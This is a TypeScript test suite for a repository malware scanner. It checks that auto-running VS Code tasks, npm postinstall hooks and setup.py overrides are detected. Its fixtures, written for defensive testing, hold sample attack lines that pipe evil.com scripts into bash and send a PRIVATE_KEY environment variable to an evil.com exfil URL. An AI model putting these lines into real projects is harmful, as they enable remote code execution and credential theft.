/**
 * Integration tests for the Scanner class
 * Tests directory walking, verdict logic, file filtering, timeout, abort
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { Scanner } from './index';

let tmpDir: string;

function createTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'reposcan-test-'));
}

function writeFile(dir: string, relativePath: string, content: string) {
  const fullPath = path.join(dir, relativePath);
  fs.mkdirSync(path.dirname(fullPath), { recursive: true });
  fs.writeFileSync(fullPath, content, 'utf-8');
}

beforeEach(() => {
  tmpDir = createTmpDir();
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

// ============================================
// Verdict logic
// ============================================

describe('verdict determination', () => {
  it('returns high verdict when high-severity finding exists', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{
        "version": "2.0.0",
        "tasks": [{
          "label": "evil",
          "type": "shell",
          "command": "node evil.js",
          "runOn": "folderOpen",
          "presentation": { "reveal": "never" }
        }]
      }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.verdict).toBe('high');
    expect(result.findings.some((f) => f.severity === 'high')).toBe(true);
  });

  it('returns medium verdict with only medium-severity findings', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{ "tasks": [{ "isBackground": true }] }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.verdict).toBe('medium');
  });

  it('returns low verdict for clean repo', async () => {
    // Use .txt files that don't match any rule filePatterns
    writeFile(tmpDir, 'README.txt', 'My Project');
    writeFile(tmpDir, 'notes.txt', 'Some notes');

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.verdict).toBe('low');
    expect(result.findings).toHaveLength(0);
  });
});

// ============================================
// File scanning
// ============================================

describe('file scanning', () => {
  it('scans .vscode/tasks.json', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{ "tasks": [{ "runOn": "folderOpen" }] }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings.some((f) => f.ruleId === 'vscode-task-auto-run')).toBe(true);
  });

  it('scans package.json for install hooks', async () => {
    writeFile(
      tmpDir,
      'package.json',
      `{ "scripts": { "postinstall": "node steal.js" } }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings.some((f) => f.ruleId === 'js-postinstall-script')).toBe(true);
  });

  it('scans Python files', async () => {
    writeFile(
      tmpDir,
      'setup.py',
      `from setuptools import setup\nsetup(cmdclass={'install': Evil})`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings.some((f) => f.ruleId === 'py-setup-cmdclass')).toBe(true);
  });

  it('scans shell scripts', async () => {
    writeFile(
      tmpDir,
      'install.sh',
      `#!/bin/bash\ncurl https://evil.com/setup | bash`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings.some((f) => f.ruleId === 'sh-curl-bash')).toBe(true);
  });

  it('counts scanned files', async () => {
    writeFile(tmpDir, 'a.js', 'const a = 1;');
    writeFile(tmpDir, 'b.js', 'const b = 2;');
    writeFile(tmpDir, 'c.py', 'x = 3');

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.scannedFiles).toBeGreaterThanOrEqual(3);
  });

  it('records scan duration', async () => {
    writeFile(tmpDir, 'index.js', 'console.log("hi");');

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.scanDuration).toBeGreaterThanOrEqual(0);
  });

  it('includes timestamp in result', async () => {
    writeFile(tmpDir, 'index.js', '');

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.timestamp).toBeTruthy();
    expect(() => new Date(result.timestamp)).not.toThrow();
  });
});

// ============================================
// Exclusions
// ============================================

describe('exclusions', () => {
  it('excludes node_modules', async () => {
    writeFile(
      tmpDir,
      'node_modules/evil-pkg/index.js',
      `eval("steal()")`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings).toHaveLength(0);
  });

  it('excludes .git directory', async () => {
    writeFile(tmpDir, '.git/hooks/pre-commit', '#!/bin/bash\ncurl evil.com | bash');

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings).toHaveLength(0);
  });

  it('does NOT exclude .vscode (critical scan target)', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{ "tasks": [{ "runOn": "folderOpen" }] }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it('skips files larger than maxFileSize', async () => {
    const largeContent = 'x'.repeat(2 * 1024 * 1024); // 2MB
    writeFile(tmpDir, 'large.js', largeContent);

    const scanner = new Scanner({ rootPath: tmpDir, maxFileSize: 1024 * 1024 });
    const result = await scanner.scan();
    // large.js should not be scanned
    expect(result.scannedFiles).toBe(0);
  });
});

// ============================================
// Abort
// ============================================

describe('abort', () => {
  it('stops scanning when aborted', async () => {
    // Create many files
    for (let i = 0; i < 100; i++) {
      writeFile(tmpDir, `file${i}.js`, `eval("code${i}")`);
    }

    const scanner = new Scanner({ rootPath: tmpDir });

    // Abort immediately
    setTimeout(() => scanner.abort(), 0);
    const result = await scanner.scan();

    // Should have fewer findings than total files (scan was interrupted)
    // The exact count depends on timing, but it should complete without error
    expect(result).toBeDefined();
    expect(result.verdict).toBeDefined();
  });
});

// ============================================
// Multiple findings per file
// ============================================

describe('multiple findings', () => {
  it('reports multiple findings from different rules on one file', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{
        "tasks": [{
          "label": "evil",
          "runOn": "folderOpen",
          "isBackground": true,
          "presentation": { "reveal": "never" }
        }]
      }`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();

    const ruleIds = result.findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('vscode-task-auto-run');
    expect(ruleIds).toContain('vscode-task-hidden-terminal');
    expect(ruleIds).toContain('vscode-task-background');
  });

  it('aggregates findings across multiple files', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{ "tasks": [{ "runOn": "folderOpen" }] }`
    );
    writeFile(
      tmpDir,
      'package.json',
      `{ "scripts": { "postinstall": "node evil.js" } }`
    );
    writeFile(
      tmpDir,
      'evil.js',
      `eval("steal()")`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();

    const categories = [...new Set(result.findings.map((f) => f.category))];
    expect(categories).toContain('vscode-config');
    expect(categories).toContain('javascript');
  });
});

// ============================================
// DPRK-style attack simulation
// ============================================

describe('real-world attack patterns', () => {
  it('detects DPRK-style tasks.json attack', async () => {
    writeFile(
      tmpDir,
      '.vscode/tasks.json',
      `{
        "version": "2.0.0",
        "tasks": [
          {
            "label": "eslint-check",
            "type": "shell",
            "command": "node .vscode/check.js",
            "runOn": "folderOpen",
            "presentation": {
              "reveal": "never",
              "panel": "dedicated",
              "close": true
            },
            "isBackground": true
          }
        ]
      }`
    );
    writeFile(
      tmpDir,
      '.vscode/check.js',
      `const { execSync } = require('child_process');
       execSync('curl https://evil.com/payload | bash');`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();

    expect(result.verdict).toBe('high');

    const ruleIds = result.findings.map((f) => f.ruleId);
    // Should catch the auto-run task
    expect(ruleIds).toContain('vscode-task-auto-run');
    // Should catch the hidden terminal
    expect(ruleIds).toContain('vscode-task-hidden-terminal');
    // Should catch the background execution
    expect(ruleIds).toContain('vscode-task-background');
    // Should catch the auto-close
    expect(ruleIds).toContain('vscode-task-auto-close');
  });

  it('detects malicious npm package', async () => {
    writeFile(
      tmpDir,
      'package.json',
      `{
        "name": "lodassh",
        "scripts": {
          "postinstall": "node setup.js"
        }
      }`
    );
    writeFile(
      tmpDir,
      'setup.js',
      `const { exec } = require('child_process');
       exec('curl https://evil.com/steal.sh | bash');
       const privateKey = process.env.PRIVATE_KEY;
       fetch("https://evil.com/exfil?key=" + privateKey);`
    );

    const scanner = new Scanner({ rootPath: tmpDir });
    const result = await scanner.scan();

    expect(result.verdict).toBe('high');
    const ruleIds = result.findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('js-postinstall-script');
    expect(ruleIds).toContain('js-child-process-exec');
    expect(ruleIds).toContain('js-private-key-handling');
  });
});
